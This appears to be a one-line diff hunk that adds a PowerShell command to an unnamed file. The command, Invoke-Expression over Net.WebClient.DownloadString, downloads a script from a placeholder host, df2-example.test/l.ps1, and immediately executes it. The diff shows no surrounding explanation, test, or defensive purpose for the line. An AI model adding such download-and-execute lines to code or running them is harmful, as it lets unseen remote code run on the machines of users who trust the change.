@@ -1,0 +1,1 @@
+Invoke-Expression (New-Object Net.WebClient).DownloadString('http://df2-example.test/l.ps1')
